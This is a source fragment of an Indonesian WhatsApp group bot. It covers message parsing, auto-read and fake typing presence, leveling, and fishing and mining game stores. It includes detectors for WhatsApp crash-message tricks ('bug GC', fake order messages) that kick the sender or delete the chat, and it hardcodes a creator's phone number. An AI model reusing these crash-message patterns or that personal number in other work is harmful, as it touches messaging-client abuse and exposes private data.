		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
               const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ' '
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
const reply2 = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted: mek, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})
        }
// Auto Read Group 
var chats = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readGc === false) return
await alpha.chatRead(jid)
})
// Auto Read Private 
var chatss = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await alpha.chatRead(jid)
})
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
alpha.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply2(`Keqing mau kick tapi keqing bukan admin T_T`) })
alpha.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
alpha.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply2('Fake Troli Detected \n\n' + require('util').format(m.key))
await alpha.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}

if (autovn) {
	if (autovn === false) return
await alpha.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await alpha.updatePresence(from, Presence.composing)
}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const runtime = process.uptime() 
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		let bio_nya = await alpha.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumberr = [`${targetpc}@s.whatsapp.net`]
		const ownerNumberrr = `${targetpc}@s.whatsapp.net`
		const isOwner = ownerNumberr.includes(sender)
		try {
					pp_userb = await alpha.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
		const getGroupAdminss = (participants) => {
	admins = []
	for (let i of participants) {
		i.isAdmin ? admins.push(i.jid) : ''
	}
	return admins
}
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const totalgroup = await alpha.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await alpha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdminss(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntivirtex = isGroup ? antivirtex.includes(from) : false
		const isLevelingOn = isGroup ? _leveling.includes(from) : false
		const isNsfw = isGroup ? _nsfw.includes(from) : false
		const isEventon = isGroup ? event.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		const alphaNumber = [`62859193578139@s.whatsapp.net`, `62859193578139@s.whatsapp.net` ]
		const isCreator = alphaNumber.includes(sender)
		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
		const gcount = isPremium ? gcounttprem : gcounttuser
		const isBanned = banned.includes(sender)
		if (isCmd && isBanned) return reply2(lang.benned())
		const isVote = isGroup ? voting.includes(from) : false
		const ratee = ["Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const ini_mark = `0@s.whatsapp.net`
        const alfa = `${targetpc}@s.whatsapp.net`
		const alfa1 = `${targetpc}@s.whatsapp.net`
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = alpha.user.phone
		const status = `${banChats ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		q3 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q4 = Object.keys(mek.message)[0] == "buttonsResponseMessage" ? mek.message.buttonsResponseMessage.selectedButtonId : ""
		q5 = Object.keys(mek.message)[0] == "listResponseMessage" ? mek.message.listResponseMessage.singleSelectReply.selectedRowId: ""
		butresx = (type === 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const isAfkOn = off.checkAfkUser(sender, _off)
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
					const belipremgame = (sender, asu) => {
						var found = false;
						Object.keys(glimit).forEach((i) => {
							if(glimit[i].id == sender){
								found = i
								}
							})
						if (found !== false) {
							glimit[found].glimit += asu;
							fs.writeFileSync('./database/glimit.json',JSON.stringify(glimit))
							}
						}
const beliprem = (sender, asu) => {
    let found = false
	Object.keys(limit).forEach((i) => {
		if (limit[i].id === sender) {
			found = i
		}
	})
		if (found !== false) {
			limit[found].limit += asu
			fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
		}
}

const addRegisterUser = (userid, sender, bio, time) => {
const objp = { id: userid, nomor: sender, bio: bio, time: time }
register.push(objp)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
}
const cekUser = (sender) => {
let status = false
Object.keys(register).forEach((i) => {
if (register[i].id === sender) {
status = true
}
})
return status
}

const isRegister = cekUser(sender)
					
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./src/level.json', JSON.stringify(_level))
	}
}

					const addLevelingId = (sender) => {
						const obj = { id: sender, xp: 1, level: 1 }
						_level.push(obj)
						fs.writeFileSync('./src/level.json', JSON.stringify(_level))
						}
					const nebal = (angka) => {
						return Math.floor(angka)
						}
					function randomNomor(angka){
						return Math.floor(Math.random() * angka) + 1
						}
					const levelRole = getLevelingLevel(sender)
					const addATM = (sender) => {
        	const objo = {id: sender, uang : 0}
            uang.push(objo)
            fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
					//MANCING FUNCTION BY TAUFIK - KUN
        const addIkan = (sender, amount) => {
        let position = false
        Object.keys(ikan).forEach((i) => {
    	    if (ikan[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ikan[position].fish += amount
    	fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
    	}
    }
    
    const getMancingIkan = (sender) => {
    let position = false 
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].fish
	}
}

    const getMancingId = (sender) => {
    let position = false
    Object.keys(ikan).forEach((i) => {
	if (ikan[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ikan[position].id
    }
}
    
    const addMancingId = (sender) => {
        const ovj = {id: sender, fish: 0}
        ikan.push(ovj)
        fs.writeFileSync('./database/user/ikan.json', JSON.stringify(ikan))
        }
    
    const jualIkan = (sender, amount) => {
        	let position = false
            Object.keys(ikan).forEach((i) => {
                if (ikan[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ikan[position].fish -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF MANCING FUNCTION

//PLANET GOO FUNCTION BY RIFAI
        const addPlanet = (sender, amount) => {
        let position = false
        Object.keys(planet).forEach((i) => {
    	    if (planet[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	planet[position].hape += amount
    	fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
    	}
    }
    
    const getBertualangPlanet = (sender) => {
    let position = false 
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].hape
	}
}

    const getPlaneId = (sender) => {
    let position = false
    Object.keys(planet).forEach((i) => {
	if (planet[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return planet[position].id
    }
}
    
    const addPlaneId = (sender) => {
        const ovj = {id: sender, hape: 0}
        planet.push(ovj)
        fs.writeFileSync('./database/user/planet.json', JSON.stringify(planet))
        }
    
    const jualbahankimia = (sender, amount) => {
        	let position = false
            Object.keys(planet).forEach((i) => {
                if (planet[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                planet[position].hape -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//AKHIRNYA SELESEI NI GO PLANET (◡ ω ◡)
    //by ARYA & FELIX
//mining coal
        const addCoal = (sender, amount) => {
        let position = false
        Object.keys(coal).forEach((i) => {
    	    if (coal[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	coal[position].arang += amount
    	fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
    	}
    }
    
    const getMiningcoal = (sender) => {
    let position = false 
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].arang
	}
}

    const getMiningId = (sender) => {
    let position = false
    Object.keys(coal).forEach((i) => {
	if (coal[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return coal[position].id
    }
}
    
    const addMiningId = (sender) => {
        const ovj = {id: sender, arang: 0}
        coal.push(ovj)
        fs.writeFileSync('./database/user/coal.json', JSON.stringify(coal))
        }
    
    const jualcoal = (sender, amount) => {
        	let position = false
            Object.keys(coal).forEach((i) => {
                if (coal[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                coal[position].arang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining stone
        const addStone = (sender, amount) => {
        let position = false
        Object.keys(stone).forEach((i) => {
    	    if (stone[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	stone[position].batu += amount
    	fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
    	}
    }
    
    const getMiningstone = (sender) => {
    let position = false 
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].batu
	}
}

    const getBatuId = (sender) => {
    let position = false
    Object.keys(stone).forEach((i) => {
	if (stone[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return stone[position].id
    }
}
    
    const addBatuId = (sender) => {
        const ovj = {id: sender, batu: 0}
        stone.push(ovj)
        fs.writeFileSync('./database/user/stone.json', JSON.stringify(stone))
        }
    
    const jualstone = (sender, amount) => {
        	let position = false
            Object.keys(stone).forEach((i) => {
                if (stone[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                stone[position].batu -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //mining ore
        const addOre = (sender, amount) => {
        let position = false
        Object.keys(ore).forEach((i) => {
    	    if (ore[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ore[position].copperore += amount
    	fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
    	}
    }
    
    const getMiningore = (sender) => {
    let position = false 
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].copperore
	}
}

    const getOreId = (sender) => {
    let position = false
    Object.keys(ore).forEach((i) => {
	if (ore[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ore[position].id
    }
}
    
    const addOreId = (sender) => {
        const ovj = {id: sender, copperore: 0}
        ore.push(ovj)
        fs.writeFileSync('./database/user/ore.json', JSON.stringify(ore))
        }
    
    const jualore = (sender, amount) => {
        	let position = false
            Object.keys(ore).forEach((i) => {
                if (ore[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ore[position].copperore -= amount
                fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
            }
        }
    		//END OF mining
    //mining ingot
        const addIngot = (sender, amount) => {
        let position = false
        Object.keys(ingot).forEach((i) => {
    	    if (ingot[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	ingot[position].copperingot += amount
    	fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
    	}
    }
    
    const getMiningingot = (sender) => {
    let position = false 
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].copperingot
	}
}

    const getIngotId = (sender) => {
    let position = false
    Object.keys(ingot).forEach((i) => {
	if (ingot[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return ingot[position].id
    }
}
    
    const addIngotId = (sender) => {
        const ovj = {id: sender, copperingot: 0}
        ingot.push(ovj)
        fs.writeFileSync('./database/user/ingot.json', JSON.stringify(ingot))
        }
    
    const jualingot = (sender, amount) => {
        	let position = false
            Object.keys(ingot).forEach((i) => {
                if (ingot[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                ingot[position].copperingot -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
    		//END OF mining
    
    //Nebang
        const addKayu = (sender, amount) => {
        let position = false
        Object.keys(kayu).forEach((i) => {
    	    if (kayu[i].id === sender) {
    	    position = i
    	    }
    	})
    	if (position !== false) {
    	kayu[position].wood += amount
    	fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
    	}
    }
    
    const getNebangKayu = (sender) => {
    let position = false 
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].wood
	}
}

    const getNebangId = (sender) => {
    let position = false
    Object.keys(kayu).forEach((i) => {
	if (kayu[i].id === sender) {
	position = i
	}
})
if (position !== false) {
return kayu[position].id
    }
}
    
    const addNebangId = (sender) => {
        const ovj = {id: sender, wood: 0}
        kayu.push(ovj)
        fs.writeFileSync('./database/user/kayu.json', JSON.stringify(kayu))
        }
    
    const jualKayu = (sender, amount) => {
        	let position = false
            Object.keys(kayu).forEach((i) => {
                if (kayu[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                kayu[position].wood -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/user/uang.json', JSON.stringify(uang))
            }
        }
        //FUCNTION MANCING BY TAUFIK - KUN
        if (isGroup && isEventon) {
        const Fisha = getMancingIkan(sender)
        const FishId = getMancingId(sender)
        if (Fisha === undefined && FishId === undefined) addMancingId(sender)
        }
	//FUCNTION GOPLANET BY RIPAI
        if (isGroup && isEventon) {
        const Hapea = getBertualangPlanet(sender)
        const HapeId = getPlaneId(sender)
        if (Hapea === undefined && HapeId === undefined) addPlaneId(sender)
        }
	   //FUCNTION mining coal
        if (isGroup && isEventon) {
        const Coala = getMiningcoal(sender)
        const CoalId = getMiningId(sender)
        if (Coala === undefined && CoalId === undefined) addMiningId(sender)
        }
        //FUCNTION mining batu
        if (isGroup && isEventon) {
        const Stonea = getMiningstone(sender)
        const StoneId = getBatuId(sender)
        if (Stonea === undefined && StoneId === undefined) addBatuId(sender)
        }
        //FUCNTION mining ore
        if (isGroup && isEventon) {
        const Orea = getMiningore(sender)
        const OreId = getOreId(sender)
        if (Orea === undefined && OreId === undefined) addOreId(sender)
        }
        //FUCNTION lebur ingot
        if (isGroup && isEventon) {
        const Ingota = getMiningingot(sender)
        const IngotId = getIngotId(sender)
        if (Ingota === undefined && IngotId === undefined) addIngotId(sender)
        }
        //FUCNTION nebang kayu
        if (isGroup && isEventon) {
        const Kayua = getNebangKayu(sender)
        const KayuId = getNebangId(sender)
        if (Kayua === undefined && KayuId === undefined) addNebangId(sender)
        }
        if (isRegister && isGroup ) {
            const checkATM = checkATMuser(sender)
            try {
                if (checkATM === undefined) addATM(sender)
                const uangsaku = Math.floor(Math.random() * 10) + 90
                addKoinUser(sender, uangsaku)
            } catch (err) {
                console.error(err)
            }
        }
					var role = 'Bronze 1'
					if (levelRole <= 2) {
						role = 'Bronze 1'
						} else if (levelRole <= 10) {
							role = 'Bronze 2'
							} else if (levelRole <= 20) {
								role = 'Bronze 3'
								} else if (levelRole <= 30) {
									role = 'Bronze 4'
									} else if (levelRole <= 40) {
										role = 'Bronze 5'
										} else if (levelRole <= 70) {
											role = 'Silver 1'
											} else if (levelRole <= 85) {
												role = 'Silver 2'
												} else if (levelRole <= 95) {
													role = 'Silver 3'
													} else if (levelRole <= 105) {
														role = 'Silver 4'
														} else if (levelRole <= 125) {
															role = 'Silver 5'
															} else if (levelRole <= 150) {
																role = 'Gold 1'
																} else if (levelRole <= 170) {
																	role = 'Gold 2'
																	} else if (levelRole <= 190) {
																		role = 'Gold 3'
																		} else if (levelRole <= 210) {
																			role = 'Gold 4'
																			} else if (levelRole <= 230) {
																				role = 'Gold 5'
																				} else if (levelRole <= 260) {
																					role = 'Platinum 1'
																					} else if (levelRole <= 290) {
																						role = 'Platinum 2'
																						} else if (levelRole <= 320) {
																							role = 'Platinum 3'
																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Sunday"; break;
                case 1: hari = "Monday"; break;
                case 2: hari = "Tuesday"; break;
                case 3: hari = "Wednesday"; break;
                case 4: hari = "Thursday"; break;
                case 5: hari = "Friday"; break;
                case 6: hari = "Saturday"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "January"; break;
                case 1: bulan1 = "February"; break;
                case 2: bulan1 = "March"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "May"; break;
                case 5: bulan1 = "June"; break;
                case 6: bulan1 = "July"; break;
                case 7: bulan1 = "August"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "October"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "December"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Time : " + jam + ":" + menit + ":" + detik + " Wib";     
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
            
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
